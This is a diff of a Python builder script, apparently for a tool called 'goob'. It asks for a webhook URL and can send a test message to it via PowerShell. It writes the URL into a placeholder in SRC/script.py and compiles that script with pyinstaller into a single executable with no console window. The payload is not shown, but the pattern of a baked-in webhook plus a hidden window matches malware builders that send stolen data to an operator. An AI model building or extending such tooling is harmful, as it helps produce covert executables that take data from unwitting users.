@@ -5,24 +5,26 @@ from colorama import Fore, Style, init
 import time
 import sys
 
-# Initialize colorama
+
 init(autoreset=True)
 
 def display_ascii_art():
     ascii_art = r"""
-      _,---.     _,.---._       _,.---._                
-  _.='.'-,  \  ,-.' , -  `.   ,-.' , -  `.    _..---.   
- /==.'-     / /==/_,  ,  - \ /==/_,  ,  - \ .' .'.-. \  
-/==/ -   .-' |==|   .=.     |==|   .=.     /==/- '=' /  
-|==|_   /_,-.|==|_ : ;=:  - |==|_ : ;=:  - |==|-,   '   
-|==|  , \_.' )==| , '='     |==| , '='     |==|  .=. \  
-\==\-  ,    ( \==\ -    ,_ / \==\ -    ,_ //==/- '=' ,| 
- /==/ _  ,  /  '.='. -   .'   '.='. -   .'|==|   -   /  
- `--`------'     `--`--''       `--`--''  `-._`.___,'   
+   
+-----------------------------------------------      
+ ________  ________  ________  ________   v1.3  
+|\   ____\|\   __  \|\   __  \|\   __  \    
+\ \  \___|\ \  \|\  \ \  \|\  \ \  \|\ /_   
+ \ \  \  __\ \  \\\  \ \  \\\  \ \   __  \  
+  \ \  \|\  \ \  \\\  \ \  \\\  \ \  \|\  \ 
+   \ \_______\ \_______\ \_______\ \_______\
+    \|_______|\|_______|\|_______|\|_______|
+                                           
+-----------------------------------------------                                       
     """
     print(Fore.LIGHTBLUE_EX + ascii_art)
 
-# Cool loading animation with dynamic spinner and alternating colors
+
 def loading_animation(message, color_sequence=None, duration=5):
     if color_sequence is None:
         color_sequence = [Fore.LIGHTYELLOW_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTMAGENTA_EX]
@@ -45,18 +47,18 @@ def loading_animation(message, color_sequence=None, duration=5):
     print()  # Just move to the next line, don't say "Done!"
 
 def main():
-    # Display ASCII art
+  
     display_ascii_art()
 
-    # Prompt the user to enter the webhook URL
+   
     webhook = input(Fore.LIGHTGREEN_EX + "Enter the webhook URL: ")
 
-    # Ask if the user wants to test the webhook
+
     test_webhook = input(Fore.LIGHTGREEN_EX + "Do you want to test the webhook? (y/n): ").strip().lower()
     if test_webhook == 'y':
         loading_animation("Testing the webhook", duration=3)
         
-        # Test the webhook using subprocess
+     
         test_command = f"powershell -Command \"try {{Invoke-RestMethod -Uri '{webhook}' -Method POST -ContentType 'application/json' -Body '{{\\\"content\\\":\\\"goob says hi, say hi to goob\\\"}}'; exit 0}} catch {{exit 1}}\""
         result = subprocess.run(test_command, shell=True)  # Using subprocess.run()
 
@@ -69,17 +71,17 @@ def main():
     else:
         print(Fore.LIGHTYELLOW_EX + "Skipping webhook test.")
 
-    # Copy script.py to script_backup.py
+   
     shutil.copyfile("SRC/script.py", "SRC/script_backup.py")
 
-    # Replace {{WEBHOOK}} in script.py with the webhook URL
+ 
     with open("SRC/script.py", 'r') as file:
         script_content = file.read()
     script_content = script_content.replace('{{WEBHOOK}}', webhook)
     with open("SRC/script.py", 'w') as file:
         file.write(script_content)
 
-    # Prompt the user if they want to rename the output executable
+    
     while True:
         rename = input(Fore.LIGHTGREEN_EX + "Do you want to rename the output executable? (y/n): ").strip().lower()
         if rename == 'y':
@@ -92,14 +94,14 @@ def main():
         else:
             print(Fore.RED + 'Invalid input. Please type "y" for yes or "n" for no.')
 
-    # Build the executable
+    
     loading_animation("Building the executable", [Fore.MAGENTA, Fore.CYAN, Fore.LIGHTYELLOW_EX], duration=5)  # Cool loading animation
 
-    # Compilation starts immediately after the animation without "Done!" message
+    
     build_command = f"pyinstaller --onefile --noconsole --distpath dist --workpath build --specpath build SRC/script.py --name {'script' if rename == 'n' else newname}"
     subprocess.run(build_command, shell=True)  # Using subprocess.run()
 
-    # Restore the original script
+  
     shutil.copyfile("SRC/script_backup.py", "SRC/script.py")
     os.remove("SRC/script_backup.py")
 
